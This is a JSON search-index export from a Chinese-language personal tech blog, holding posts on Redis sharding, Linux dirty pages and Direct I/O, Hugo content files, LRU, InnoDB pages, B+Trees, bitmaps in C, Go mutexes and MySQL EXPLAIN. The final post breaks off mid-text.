[{"body":"asdfasdf\n","link":"https://www.qiankun.info/","section":"","tags":null,"title":""},{"body":"","link":"https://www.qiankun.info/posts/","section":"posts","tags":null,"title":"Posts"},{"body":"","link":"https://www.qiankun.info/tags/redis/","section":"tags","tags":null,"title":"Redis"},{"body":"Redis 集群的分片机制是其分布式架构的核心，通过 哈希槽（Hash Slot） 实现数据在多节点间的分布与管理。以下是其分片机制的详细解析：\n一、哈希槽的基本原理 槽位划分与键值映射\nRedis 集群将数据划分为 16384 个固定哈希槽（编号 0-16383），每个键通过以下步骤确定所属槽位：\nStep 1：计算键的 CRC16 校验和，得到一个 16bit 的哈希值。 Step 2：对哈希值取模 CRC16(key) % 16384，确定具体槽号。\n例如，键 user:1000 的哈希值为 12345，则分配到槽 12345。 槽位分配规则\n自动分配：通过 redis-cli --cluster create 命令创建集群时，槽位会均分到各主节点。 手动分配：使用 CLUSTER ADDSLOTS 手动指定节点负责的槽范围（需覆盖全部 16384 个槽）。 槽位与节点的动态映射\n每个节点维护完整的槽位分配表，并通过 Gossip 协议 与其他节点同步状态。客户端请求时，若目标键不在此节点，返回 MOVED 重定向响应，指引客户端访问正确节点。\n二、分片机制的核心优势 灵活的数据分布\n相比一致性哈希，哈希槽允许 手动调整槽位分配，例如为高性能节点分配更多槽，避免数据倾斜。 解耦数据与节点的直接绑定，简化扩缩容流程。 高效的分片迁移\n数据迁移以 槽位为单位（而非单个键），减少网络开销。例如，新增节点时，通过 CLUSTER REBALANCE 命令从现有节点转移部分槽到新节点。\n高可用性与容错\n每个主节点（Master）有 1-N 个从节点（Slave），主节点故障时，从节点通过 类似 Raft 的选举机制 晋升为主节点，接管原槽位。 故障检测基于心跳超时和多数派确认机制（超过半数主节点判定节点不可达时触发故障转移）。 三、分片机制的关键限制 跨槽操作的限制\n事务与 Lua 脚本：要求所有操作的键必须位于同一槽。可通过 哈希标签（Hash Tags） 强制多个键映射到同一槽。\n例如：键 {user1000}.profile 和 {user1000}.orders 均以 user1000 计算槽位。 批量操作：如 MGET、MSET 仅支持同一槽内的键，否则需客户端分批处理。 客户端路由复杂性\n智能客户端：需缓存槽位映射表，直接定位目标节点，减少重定向次数。 非智能客户端：依赖 MOVED 和 ASK 响应动态更新路由信息。 四、动态扩缩容与数据迁移 扩容流程\n新增节点后，通过 CLUSTER REBALANCE 从现有节点迁移部分槽到新节点，实现负载均衡。 迁移期间，客户端请求可能收到 ASK 临时重定向，保证服务可用性。 缩容流程\n需先将要移除节点的槽位迁移至其他节点，再执行节点下线。 五、与其他分片方案的对比 方案 原理 优点 缺点 Redis Cluster 哈希槽（16384固定槽） 灵活分配、高效迁移、高可用 跨槽操作受限，需客户端适配 客户端分片 客户端按规则（如范围）分片 实现简单，无需服务端支持 无自动故障转移，扩缩容复杂 代理分片 中间件（如Twemproxy）路由 客户端无感知，统一入口 性能瓶颈，增加运维复杂度 总结 Redis 集群通过哈希槽机制实现了 水平扩展、负载均衡与高可用性，适用于海量数据和高并发场景。其核心在于槽位的逻辑分片与动态管理，但需注意跨槽操作限制及客户端适配问题。\n","link":"https://www.qiankun.info/posts/redis%E5%88%86%E7%89%87%E6%9C%BA%E5%88%B6/","section":"posts","tags":["redis"],"title":"Redis 分片机制"},{"body":"","link":"https://www.qiankun.info/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://www.qiankun.info/tags/linux/","section":"tags","tags":null,"title":"Linux"},{"body":"","link":"https://www.qiankun.info/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","section":"tags","tags":null,"title":"性能优化"},{"body":"页缓存的脏页（Dirty Page）是操作系统中内存管理的关键概念，特指已被应用程序修改但尚未同步到磁盘的内存数据页。以下从定义、产生原因、刷新机制及影响等方面进行详细说明：\n一、定义与核心特性 脏页的本质\n脏页是页缓存（Page Cache）中已被修改的数据页，其内存版本与磁盘版本不一致。例如，当程序修改文件时，数据先写入内存页缓存，此时该页被标记为“脏”（通过设置内核的 PG_dirty 标志），直到同步到磁盘后才变为“干净页”。\n页缓存的作用\n页缓存是内核用于加速磁盘读写的机制，将频繁访问的磁盘数据缓存在内存中。脏页的存在延迟了磁盘写入，减少了高频I/O操作，从而提升系统性能。\n二、脏页的产生场景 应用程序的写操作\n例如数据库更新数据时，修改首先写入内存页缓存而非直接落盘，此时生成脏页。 文件系统操作\n修改文件内容（如文本编辑后保存）会触发脏页生成，数据暂存于内存中等待同步。 三、脏页的刷新机制 脏页需通过以下机制同步到磁盘以保障数据一致性：\n触发刷新的条件\n内存不足：当系统需淘汰内存页时，若淘汰的是脏页，则强制刷新。 阈值控制：通过内核参数（如 dirty_ratio、dirty_background_ratio）设定脏页占比阈值，超过则触发异步或同步刷新。 周期性刷新：内核线程（如 pdflush 或 kworker）定期扫描脏页并回写，周期由 dirty_writeback_centisecs 参数控制。 主动同步：调用 fsync() 或 sync() 强制立即刷新。 刷新策略优化\n机械硬盘：启用“邻接页刷新”（innodb_flush_neighbors=1），合并I/O减少随机写入。 SSD：禁用邻接刷新（innodb_flush_neighbors=0），避免不必要的批量操作。 四、脏页的影响与风险 性能影响\n延迟波动：大量脏页刷新可能导致I/O瓶颈，使查询或写入响应时间变长。 内存压力：脏页过多会占用可用内存，可能触发OOM（内存溢出）或强制换出（Swap）。 数据一致性风险\n若系统崩溃前未刷新脏页，可能导致数据丢失。例如，数据库事务未持久化时断电，需依赖日志（如redo log）恢复。 五、优化建议 调整内核参数\n设置 dirty_ratio（最大脏页占比）和 dirty_background_ratio（后台刷新阈值），平衡性能与数据安全。 对于数据库（如MySQL），配置 innodb_io_capacity 匹配磁盘IOPS能力，控制刷新速度。 硬件适配\n机械硬盘优先启用邻接页刷新，SSD则关闭该功能。 监控与手动干预\n通过 sysctl -a | grep dirty 查看脏页状态，使用 sync 命令强制刷新。 监控工具（如 vmstat 或 iostat）追踪脏页比例和I/O负载。 总结 脏页是内存与磁盘数据同步的中间状态，其管理直接影响系统性能和数据可靠性。合理配置刷新策略、监控脏页比例，并结合硬件特性优化，是保障高效运行的关键。\n","link":"https://www.qiankun.info/posts/%E8%84%8F%E9%A1%B5/","section":"posts","tags":["性能优化","linux"],"title":"脏页"},{"body":"","link":"https://www.qiankun.info/tags/hugo/","section":"tags","tags":null,"title":"Hugo"},{"body":"在 Hugo 中，index.md 和 _index.md 的作用与内容组织结构密切相关，两者分别承担不同的角色：\n1. index.md：作为内容页面的核心文件 作用：\nindex.md 是 单个内容页面的主文件，通常用于生成一个独立页面的 HTML（例如文章或独立页面）。当 Hugo 处理包含 index.md 的文件夹时，会将其渲染为 index.html，并通过 Web 服务器（如 Nginx）直接访问该文件。 典型场景： 在文章文件夹中放置 index.md，并配合图片、资源文件等，形成完整的页面内容。例如： 1content/post/2024-03-17-示例文章/ 2 ├── index.md 3 └── image.jpg 本地编辑时，Markdown 文件（如 index.md）可直接引用同级图片（如 image.jpg），确保预览和最终生成路径一致。 2. _index.md：定义分支页面的元数据和模板 作用：\n_index.md 是 分支页面（Section）的入口文件，用于定义该层级的元数据（如标题、排序规则）和模板逻辑。它不直接生成独立页面，而是控制其子内容的组织和展示方式。 典型场景： 在 content/posts/ 目录下创建 _index.md，可配置该分类的全局属性（如 weight: 1 定义排序权重）或自定义列表模板。 控制子页面列表的渲染方式。例如，通过 _index.md 指定 type: \u0026quot;posts\u0026quot;，Hugo 会调用对应的 layouts/posts/list.html 模板生成分类列表页。 对比总结 文件 适用场景 生成结果 资源管理 index.md 独立页面（如文章、关于页） example.com/post/my-article/ 与图片等资源同级存放 _index.md 分类/分支页面（如博客列表） example.com/posts/ 控制子内容结构和元数据 补充说明 资源路径管理：\n使用 index.md 时，Hugo 会将其所在文件夹视为页面的根路径，因此图片等资源可直接通过相对路径引用（如 ![图片](image.jpg)），无需担心本地预览与生成后的路径差异。 模板优先级：\n若同时存在 index.md 和 _index.md，Hugo 会优先渲染 index.md 作为独立页面，而 _index.md 仅影响分支层级的元数据。例如，content/posts/_index.md 定义分类属性，而 content/posts/hello-world/index.md 生成具体文章页。 通过合理使用这两种文件，可以高效管理 Hugo 的内容层级和渲染逻辑。\n","link":"https://www.qiankun.info/posts/index%E4%B8%8E_index/","section":"posts","tags":["hugo"],"title":"index.md 与 _index.md 文件"},{"body":"LRU（Least Recently Used）算法的核心原理是淘汰最近最少使用的数据，基于“如果一个数据最近未被访问，未来被访问的概率也较低”的假设。其实现依赖于高效的数据结构来维护访问顺序，以下是详细解析：\n一、基本原理 淘汰策略\nLRU优先淘汰最久未被访问的数据。例如，在缓存满时，新数据插入会触发淘汰机制，移除链表中最后一位（即最近未被使用的数据）。\n局部性原理支持\n程序运行过程中，数据的访问往往呈现时间局部性（近期访问的数据可能再次被访问）。LRU通过记录访问顺序，最大化利用这一特性以提高缓存命中率。\n二、关键数据结构 LRU的高效实现依赖哈希表 + 双向链表的组合：\n哈希表：提供O(1)时间复杂度的键值查询，快速定位数据是否存在。 双向链表：维护数据的访问顺序，头部存放最新访问的数据，尾部存放最久未访问的数据。 操作示例：\n访问数据：若数据存在，将其移动到链表头部。 插入数据： 若存在则更新值并移动到头部； 若不存在且缓存已满，删除尾部数据，再插入新数据到头部。 三、应用场景 操作系统页面置换\n管理物理内存与虚拟内存的页面置换，减少缺页中断。 数据库缓存\n如Redis的缓存淘汰策略，提升查询效率。 Web服务缓存\n高频访问的数据驻留内存，降低数据库压力。 四、优缺点分析 优点： 高命中率：适合局部性明显的场景。 实现相对简单：数据结构成熟，逻辑清晰。 缺点： 维护成本高：频繁移动链表节点增加开销。 偶发访问干扰：若某冷数据突然被访问，可能误保留。 通过结合哈希表的快速查询与链表的顺序维护，LRU在时间和空间复杂度上达到平衡，成为实际系统中广泛应用的淘汰策略。具体实现时需根据场景权衡性能与资源消耗。\n","link":"https://www.qiankun.info/posts/lru-%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/","section":"posts","tags":["算法"],"title":"LRU 算法原理"},{"body":"","link":"https://www.qiankun.info/tags/%E7%AE%97%E6%B3%95/","section":"tags","tags":null,"title":"算法"},{"body":"Linux 系统中的 DIRECT I/O（直接输入/输出）是一种绕过操作系统内核缓存（Page Cache）、直接在用户空间与存储设备之间传输数据的机制。它通过减少数据拷贝和上下文切换次数，提升特定场景下的性能表现，但也对应用层提出了更高的管理要求。\n一、核心原理 绕过内核缓存\nDIRECT I/O 通过 O_DIRECT 标志在打开文件时启用，数据不再经过操作系统的页缓存（Page Cache），而是直接从用户空间缓冲区写入磁盘或从磁盘读取到用户空间。这种方式避免了传统缓存 I/O 的两次数据拷贝（用户态→内核态→磁盘）。\n对齐与块大小限制\n使用 DIRECT I/O 时，缓冲区地址和数据大小必须满足以下条件：\n内存对齐：缓冲区地址需与磁盘块大小对齐（如 512B、4KB）。 块整数倍：数据大小必须是磁盘块大小的整数倍。例如，若块大小为 4KB，则读写操作需以 4KB 的倍数进行。 二、优势与适用场景 优势 降低延迟：绕过内核缓存，减少数据传输中间环节，适用于对延迟敏感的实时系统（如高频交易）。 提高吞吐量：避免缓存管理开销，适合处理大规模数据（如数据库、大数据框架 Hadoop/Spark）。 精确控制：应用可自主管理缓存策略，确保数据一致性（如数据库事务日志）。 适用场景 数据库系统（如 MySQL、PostgreSQL）：需直接控制数据写入时序，避免内核缓存导致的潜在不一致。 高性能计算：处理海量数据时减少内存拷贝开销。 日志系统：需确保日志立即落盘，防止系统崩溃丢失关键数据。 三、潜在问题与解决方案 主要挑战 性能波动\n原因：直接操作磁盘可能因设备 I/O 瓶颈导致性能下降。 优化：结合异步 I/O 或批量读写减少磁盘访问次数。 数据一致性风险\n原因：绕过缓存后，多进程/线程间同步需应用层自行处理。 解决方案：使用文件锁（flock）或结合 O_SYNC 标志强制同步写入。 资源占用增加\n原因：频繁直接 I/O 可能占用更多内存（需用户管理缓冲区）。 缓解措施：监控内存使用，优化缓冲区分配策略。 四、技术实现示例 在 C 语言中，通过 open() 系统调用启用 DIRECT I/O：\n1#include \u0026lt;fcntl.h\u0026gt; 2#include \u0026lt;unistd.h\u0026gt; 3#include \u0026lt;stdlib.h\u0026gt; 4 5int main() { 6 int fd = open(\u0026#34;testfile\u0026#34;, O_RDWR | O_DIRECT); // 启用 DIRECT I/O 7 char *buffer = aligned_alloc(512, 4096); // 分配对齐的内存（512B 对齐） 8 ssize_t bytes_read = read(fd, buffer, 4096); // 读取 4KB 数据（块大小的整数倍） 9 close(fd); 10 return 0; 11} 五、与传统缓存 I/O 的对比 特性 DIRECT I/O 缓存 I/O 数据路径 用户空间 ↔ 磁盘 用户空间 ↔ 内核缓存 ↔ 磁盘 内存拷贝次数 1 次（用户空间与磁盘直接交互） 2 次（用户态与内核态间拷贝） 适用场景 高吞吐、低延迟、精确控制 通用场景，依赖内核缓存优化性能 开发复杂度 高（需处理对齐、同步） 低（由内核自动管理） 总结 DIRECT I/O 是一种高性能但高复杂度的 I/O 机制，适合需要精细控制数据流或处理海量数据的场景。使用时需权衡其优劣势，并结合应用层缓存策略与同步机制（如 fsync）确保数据安全。\n","link":"https://www.qiankun.info/posts/direct-io/","section":"posts","tags":["linux","磁盘读写"],"title":"DIRECT I/O 文件"},{"body":"","link":"https://www.qiankun.info/tags/%E7%A3%81%E7%9B%98%E8%AF%BB%E5%86%99/","section":"tags","tags":null,"title":"磁盘读写"},{"body":"","link":"https://www.qiankun.info/tags/innodb/","section":"tags","tags":null,"title":"InnoDB"},{"body":"InnoDB的页（Page）与操作系统的页（Page）在功能和设计目标上有显著差异，但两者在I/O操作和内存管理中存在协同关系。以下是具体分析：\n1. 设计目标与作用范围 InnoDB的页：\n是数据库存储引擎的最小I/O单位，默认大小为16KB，用于组织表数据、索引、日志等结构化信息。其核心目标是减少磁盘I/O次数，通过批量加载数据提升查询效率。\n操作系统的页：\n是内存管理的最小单位，通常为4KB，负责虚拟内存与物理内存之间的映射，解决内存碎片化问题，并优化内存利用率。\n关系：\nInnoDB的一个页（16KB）对应操作系统的4个页（4KB×4）。这种设计使得InnoDB的一次磁盘I/O操作可加载多个操作系统页，减少系统调用开销。\n2. I/O操作与预读机制 InnoDB的I/O策略：\n每次从磁盘读取数据时，以16KB的页为单位加载到内存的Buffer Pool中。例如，读取某一行数据时，即使仅需少量数据，也会加载整个16KB页，以减少随机I/O。\n操作系统的预读：\n操作系统会根据局部性原理预读后续的页（例如连续4KB页）到内存缓存。InnoDB的16KB页设计恰好与这种预读策略匹配，一次加载4个操作系统页，提升顺序I/O效率。\n协同作用：\nInnoDB的页作为数据库与磁盘交互的单元，底层依赖操作系统的页管理机制完成物理读写，两者结合优化了大规模数据的吞吐性能。\n3. 内存管理与缓存 InnoDB的Buffer Pool：\n以16KB页为单位缓存热数据，通过LRU算法管理内存。当数据页被修改时，标记为脏页（Dirty Page），由后台线程异步刷盘。\n操作系统的页缓存：\n文件系统（如Linux的Page Cache）会缓存磁盘数据到内存的4KB页中。InnoDB的刷盘操作需经过操作系统页缓存，再由文件系统同步到磁盘。\n潜在冲突：\n双重缓存（Buffer Pool + 操作系统页缓存）可能导致冗余内存占用。因此，InnoDB通常建议通过O_DIRECT选项绕过操作系统页缓存，直接管理Buffer Pool以减少内存拷贝开销。\n4. 数据一致性与持久化 InnoDB的Double Write机制：\n为了防止部分写（Partial Write）导致页损坏，InnoDB先将脏页写入双写缓冲区（Doublewrite Buffer），再分两次写入磁盘。这一过程依赖操作系统的原子写能力。\n操作系统的原子页写入：\n操作系统保证单个4KB页的写入原子性，而InnoDB的16KB页可能跨多个操作系统页，需通过Double Write机制确保数据完整性。\n总结 InnoDB的页与操作系统的页通过以下方式协作：\n大小适配：InnoDB的16KB页对应4个4KB操作系统页，匹配I/O批量加载需求。 预读协同：InnoDB的页加载策略利用操作系统的顺序预读优化。 内存管理优化：通过O_DIRECT绕过操作系统缓存，直接管理Buffer Pool以减少冗余。 数据一致性保障：依赖Double Write机制和操作系统的原子写能力。 这种分层设计既发挥了数据库引擎对结构化数据的高效管理，又充分利用了操作系统底层的内存和I/O优化能力。\n","link":"https://www.qiankun.info/posts/%E9%A1%B5%E5%9C%A8innodb%E4%B8%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BA%E5%88%AB/","section":"posts","tags":["InnoDB"],"title":"页在 InnoDB 与操作系统的区别"},{"body":"","link":"https://www.qiankun.info/tags/mysql/","section":"tags","tags":null,"title":"Mysql"},{"body":"在 InnoDB 的聚簇索引中，叶子“页”和叶子“节点”本质上是同一物理存储单元的逻辑与物理视角的表述，但两者在概念层次上有细微差异：\n1. 叶子节点：逻辑结构视角 叶子节点是 B+ 树数据结构中的逻辑概念，表示索引树的最底层单元，直接存储完整的行数据（包含主键值、事务 ID、回滚指针和其他所有列的数据）。 每个叶子节点通过双向链表连接，支持范围查询的高效遍历。 2. 叶子页：物理存储视角 叶子页是 InnoDB 存储引擎管理数据的最小物理单元，对应磁盘上的一个固定大小（默认 16KB）的数据块。在聚簇索引中，每个叶子节点对应一个叶子页，即逻辑上的叶子节点在物理上表现为一个页。 页内数据按主键顺序紧凑存储，保证物理顺序与逻辑顺序一致。 3. 两者的关系 一一对应：每个叶子节点对应一个叶子页，两者是同一数据载体的不同抽象层次描述。例如，当提到“叶子节点存储数据行”时，实际是指这些数据行被组织在叶子页中。 功能差异： 叶子节点强调 B+ 树的逻辑结构，关注数据关联性（如双向链表关系）。 叶子页关注物理存储细节（如页分裂、空间利用率等），例如插入新数据时若页已满，会触发页分裂操作。 总结 在 InnoDB 的实现中，叶子节点和叶子页指向同一实体，但前者属于逻辑结构术语，后者属于物理存储术语。这种设计使得聚簇索引既能利用 B+ 树的高效查询特性，又能通过页管理机制优化磁盘 I/O 性能。\n","link":"https://www.qiankun.info/posts/%E5%8F%B6%E5%AD%90%E8%8A%82%E7%82%B9%E4%B8%8E%E5%8F%B6%E5%AD%90%E9%A1%B5/","section":"posts","tags":["mysql","InnoDB"],"title":"叶子节点与叶子页"},{"body":"B+Tree （B+树）是一种广泛应用于数据库和文件系统的多路平衡搜索树结构，其设计核心在于高效支持大规模数据存储、快速检索及范围查询。以下从结构特点、与B-Tree的差异、优势及实际应用等方面进行详细解析：\n一、 B+Tree 的核心结构特点 分层索引结构\n非叶子节点（索引层）：仅存储键值（Key）和指向子节点的指针，不存储实际数据。例如，一个4阶 B+Tree 的非叶子节点最多存储3个Key和4个指针，形成多级索引结构。 叶子节点（数据层）：存储完整数据记录或指向数据的指针，且所有叶子节点通过指针串联成有序链表。例如，MySQL中叶子节点存储主键索引对应的行数据或二级索引的聚簇索引键。 平衡性与高度控制\n树的所有叶子节点处于同一层，保证查询路径长度一致。例如，一个存储千万级数据的 B+Tree 通常仅需3-4层高度，每次查询仅需3-4次磁盘I/O。 节点分裂与合并机制：插入数据时若节点满则分裂（中间Key上移），删除时若节点不足则合并，动态维持树的平衡。 顺序访问优化\n叶子节点间通过双向或单向链表连接，支持高效的范围查询（如BETWEEN或排序操作）。例如，找到起始Key后，可沿链表直接遍历后续节点，无需回溯到根节点。 二、与B-Tree的差异对比 数据存储位置\nB-Tree的非叶子节点存储数据，而 B+Tree 的非叶子节点仅作索引，所有数据集中在叶子节点。这使得 B+Tree 的非叶子节点可容纳更多键值，降低树的高度。 范围查询效率\nB-Tree需通过树结构逐层遍历完成范围查询，而 B+Tree 通过叶子节点的链表直接顺序访问，减少磁盘I/O次数。 节点利用率\nB+Tree 的节点通常更“紧凑”。例如，在相同磁盘页大小（如16KB）下， B+Tree 的非叶子节点可存储更多Key，进一步提升查询效率。 三、 B+Tree 的优势 高效的磁盘I/O\n节点大小与磁盘页对齐（如MySQL默认16KB），单次I/O可加载更多索引数据，减少访问次数。 非叶子节点仅存储Key，相同容量下比B-Tree存储更多索引项，进一步压缩树高。 支持复杂查询\n等值查询：通过树结构快速定位叶子节点，时间复杂度为O(log_dN)（d为节点度数）。 范围查询：利用叶子节点链表实现线性遍历，避免重复回溯索引结构。 稳定性与扩展性\n所有查询均需遍历到叶子节点，保证查询时间的稳定性。例如，无论查询条件是否命中非叶子节点，最终I/O次数由树高决定。 天然支持排序操作，适合ORDER BY等场景。 四、实际应用优化（以MySQL为例） 顺序指针增强\nMySQL的InnoDB引擎对 B+Tree 进行优化，在叶子节点间增加双向链表指针，进一步提升区间扫描性能。例如，查询WHERE id BETWEEN 100 AND 200时，仅需定位到起始节点后顺序遍历链表。\n节点与页的映射\n每个 B+Tree 节点对应一个磁盘页（16KB），根节点常驻内存，子节点按需加载。 通过计算可得出：一个3层 B+Tree 可支持约2000万行数据（假设每页存储1000个Key）。 复合索引结构\n复合索引（如(name, age)）按最左前缀原则构建 B+Tree ，Key按字段顺序排列，支持多条件查询。\n五、操作机制示例 查找过程\n以查找Key=29为例：\n加载根节点（第1次I/O），确定下一层节点； 加载中间节点（第2次I/O），定位到叶子节点； 加载叶子节点（第3次I/O），通过二分查找命中目标。 插入与分裂\n若插入导致叶子节点溢出（如4阶树插入第5个Key），则分裂为两个节点，中间Key上移至父节点，递归处理父节点直至根节点。\n总结 B+Tree 通过分层索引、数据集中存储及顺序访问优化，成为数据库索引的理想选择。\n","link":"https://www.qiankun.info/posts/b+tree/","section":"posts","tags":["数据结构"],"title":" B+Tree "},{"body":"","link":"https://www.qiankun.info/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","section":"tags","tags":null,"title":"数据结构"},{"body":"1. 基本概念 位图（Bitmap），又称位数组（Bit Array）或位集合（Bitset），是一种通过二进制位（0或1）高效存储和操作数据的数据结构。每个二进制位表示某种状态（如存在/不存在、开启/关闭），常用于处理大规模布尔值集合。\n2. 核心特性 空间高效：每个元素仅占1位，相比布尔数组（每个元素占1字节）节省8倍空间。 示例：存储1亿个元素的状态仅需约12MB（(10^8 , \\text{bit} \\approx 12 , \\text{MB})）。 快速位运算：支持按位与（AND）、或（OR）、异或（XOR）等操作，高效实现集合的交、并、差运算。 随机访问：可在常数时间（O(1)）内查询或修改某一位的状态。 3. 实现原理 内存分配 位图的大小由最大元素值决定。例如，存储元素范围 [0, n-1] 需要 n 位，分配的内存大小为 (\\lceil \\frac{n}{8} \\rceil) 字节。 示例：存储0~999的数字是否存在，需1000位（125字节）。 位操作 定位位：元素 k 对应的存储位置为： 字节索引：( \\text{byteIndex} = \\left\\lfloor \\frac{k}{8} \\right\\rfloor ) （或 k \u0026gt;\u0026gt; 3） 位偏移：( \\text{bitOffset} = k % 8 ) （或 k \u0026amp; 0x07） 设置位：将第 k 位设为1： 1bytes[byteIndex] |= (1 \u0026lt;\u0026lt; bitOffset); 清除位：将第 k 位设为0： 1bytes[byteIndex] \u0026amp;= ~(1 \u0026lt;\u0026lt; bitOffset); 查询位：检查第 k 位是否为1： 1(bytes[byteIndex] \u0026amp; (1 \u0026lt;\u0026lt; bitOffset)) != 0; 4. 应用场景 集合去重与存在性检查 示例：快速判断用户ID是否已注册。 布隆过滤器（Bloom Filter） 使用多个哈希函数将元素映射到位图的多个位置，用于高效判断元素是否存在（可能有误判，但不会漏判）。 数据库索引 对低基数字段（如性别、状态）建立位图索引，加速查询。 垃圾回收标记 标记内存中的存活对象。 权限管理 每个位表示一种权限（如读、写、执行）。 图像处理 二值图像（黑白图）的像素存储。 5. 优缺点分析 优点 缺点 空间效率极高（1位/元素） 元素范围过大时内存消耗高（稀疏数据不适用） 集合操作高效（位运算） 无法直接存储额外信息（仅能表示存在性） 查询和修改速度快（O(1)） 动态扩容成本高（需重新分配内存） 6. 优化与变体 压缩位图（如Roaring Bitmap） 将位图分段，稀疏段用数组存储，密集段用位图，兼顾空间和性能。 分层位图 使用多级位图减少内存占用，例如高16位和低16位分层存储。 动态扩容 初始分配较小内存，按需扩展（需复制旧数据）。 7. 代码示例（C语言） 1#include \u0026lt;stdio.h\u0026gt; 2#include \u0026lt;stdlib.h\u0026gt; 3#include \u0026lt;stdbool.h\u0026gt; 4 5typedef struct { 6 unsigned char *data; 7 size_t size; // 最大元素值（位数） 8} Bitmap; 9 10// 初始化位图 11Bitmap* bitmap_create(size_t size) { 12 Bitmap *bm = (Bitmap*)malloc(sizeof(Bitmap)); 13 bm-\u0026gt;size = size; 14 size_t bytes = (size + 7) / 8; // 计算所需字节数 15 bm-\u0026gt;data = (unsigned char*)calloc(bytes, 1); 16 return bm; 17} 18 19// 设置位 20void bitmap_set(Bitmap *bm, size_t k) { 21 if (k \u0026gt;= bm-\u0026gt;size) return; 22 size_t byte_idx = k / 8; 23 size_t bit_offset = k % 8; 24 bm-\u0026gt;data[byte_idx] |= (1 \u0026lt;\u0026lt; bit_offset); 25} 26 27// 清除位 28void bitmap_clear(Bitmap *bm, size_t k) { 29 if (k \u0026gt;= bm-\u0026gt;size) return; 30 size_t byte_idx = k / 8; 31 size_t bit_offset = k % 8; 32 bm-\u0026gt;data[byte_idx] \u0026amp;= ~(1 \u0026lt;\u0026lt; bit_offset); 33} 34 35// 查询位 36bool bitmap_get(Bitmap *bm, size_t k) { 37 if (k \u0026gt;= bm-\u0026gt;size) return false; 38 size_t byte_idx = k / 8; 39 size_t bit_offset = k % 8; 40 return (bm-\u0026gt;data[byte_idx] \u0026amp; (1 \u0026lt;\u0026lt; bit_offset)) != 0; 41} 42 43// 释放内存 44void bitmap_free(Bitmap *bm) { 45 free(bm-\u0026gt;data); 46 free(bm); 47} 48 49int main() { 50 Bitmap *bm = bitmap_create(1000); // 存储0~999 51 bitmap_set(bm, 100); 52 printf(\u0026#34;Bit 100: %d\\n\u0026#34;, bitmap_get(bm, 100)); // 输出1 53 bitmap_clear(bm, 100); 54 printf(\u0026#34;Bit 100: %d\\n\u0026#34;, bitmap_get(bm, 100)); // 输出0 55 bitmap_free(bm); 56 return 0; 57} 8. 总结 位图是一种以空间换时间的高效数据结构，适用于元素范围明确且密集的场景。通过位运算，它能快速完成集合操作和状态管理。\n","link":"https://www.qiankun.info/posts/%E4%BD%8D%E5%9B%BEbitmap/","section":"posts","tags":["数据结构"],"title":"位图 Bitmap"},{"body":"","link":"https://www.qiankun.info/tags/go/","section":"tags","tags":null,"title":"Go"},{"body":"在 Go 语言中，sync.Mutex 和 sync.RWMutex 的选择取决于并发场景的读写比例和性能需求。以下是具体的使用场景和选择原则：\n一、sync.Mutex（互斥锁）适用场景 1. 读写操作频率均衡 场景特点：对共享资源的读和写操作频率接近，或写操作频繁。 示例： 高频更新的计数器（如实时统计）。 需要原子性修改的配置项（如开关状态）。 优势：实现简单，无额外性能开销。 2. 临界区操作耗时短 场景特点：临界区代码执行时间极短（如简单赋值或原子操作）。 示例： 更新一个结构体的某个字段。 操作一个共享的 map 中的单个键值对。 优势：短耗时操作下，互斥锁的竞争开销可以忽略。 3. 需要严格互斥 场景特点：任何并发操作必须完全互斥，不允许并行读。 示例： 银行账户的余额修改（必须串行化）。 分布式锁的本地实现。 二、sync.RWMutex（读写锁）适用场景 1. 读多写少（高并发读，低频写） 场景特点：读操作频率远高于写操作（如 90% 读 + 10% 写）。 示例： 缓存系统（如 Redis 风格的本地缓存）。 配置中心的配置读取（配置热更新时写）。 只读为主的共享数据（如全局路由表）。 优势：允许多个 goroutine 并行读，大幅提升读性能。 2. 读操作耗时较长 场景特点：读操作需要较长时间（如复杂计算或 IO 操作）。 示例： 读取一个大文件到内存并解析数据。 执行一个复杂的查询逻辑（如数据库查询）。 优势：通过并行读减少总体等待时间。 3. 写操作频率低但需要强一致性 场景特点：写操作较少，但需要保证写操作的原子性和最新数据可见性。 示例： 日志系统的日志写入（低频批量写，高频读日志状态）。 全局唯一 ID 生成器（偶尔分配新 ID 区间，频繁读取当前 ID）。 三、选择原则 指标 sync.Mutex sync.RWMutex 读写比例 读写接近或写多读少 读多写少（如 10:1 以上） 性能需求 简单、低开销 高并发读性能优化 临界区耗时 短耗时操作（纳秒级） 长耗时读操作（微秒级或更长） 代码复杂度 简单（只需 Lock/Unlock） 稍复杂（区分 RLock/RUnlock） 四、注意事项 避免锁嵌套：\n使用 RWMutex 时，禁止在持有读锁（RLock）时尝试获取写锁（Lock），否则会导致死锁。 正确做法：先释放读锁，再获取写锁。 写锁优先级：\nRWMutex 的写锁会阻塞后续所有读锁和写锁，确保写操作不会被读操作“饿死”。 性能陷阱：\n如果写操作频繁，RWMutex 可能比 Mutex 更慢（因为写锁需要等待所有读锁释放）。 在极端高并发场景下，考虑无锁结构（如 atomic 原子操作）或分片锁（sharded locks）。 五、示例场景对比 场景 1：全局配置管理 需求：99% 的请求读取配置，1% 的请求更新配置。 选择：RWMutex（允许高并发读，写锁保证更新安全）。 场景 2：实时交易系统 需求：高频修改用户账户余额（每秒 10k+ 次写操作）。 选择：Mutex 或更细粒度的锁（如账户分片锁）。 场景 3：只读缓存 需求：缓存数据初始化后几乎只读，每天定时更新一次。 选择：RWMutex（读锁完全无竞争）。 六、总结 优先 Mutex：读写均衡、操作简单、临界区短耗时。 优先 RWMutex：读多写少、读操作耗时长、需要高并发读吞吐。\n实际选择时，建议通过基准测试（go test -bench）验证两种锁在具体场景中的性能差异。 ","link":"https://www.qiankun.info/posts/mutex%E5%92%8Crwmutex%E5%9C%BA%E6%99%AF%E9%80%89%E6%8B%A9/","section":"posts","tags":["go"],"title":"Mutex 和 RWMutex 场景选择"},{"body":"在MySQL的EXPLAIN输出中，type字段为eq_ref表示查询使用了唯一索引的等值匹配，且每个索引值在关联表中对应唯一一条记录。这是性能较好的查询类型，仅次于system和const。\n以下是关键特性与适用场景：\n1. 核心特征 唯一性要求：必须基于主键或唯一索引（UNIQUE NOT NULL）进行关联查询，且索引所有部分都被使用。 单行匹配：每个索引值在关联表中只能匹配到一行数据，例如通过=操作符精确匹配主键或唯一键。 多表关联：通常出现在JOIN操作中，作为被驱动表（内表）的访问方式，且关联条件为主键或唯一键。 2. 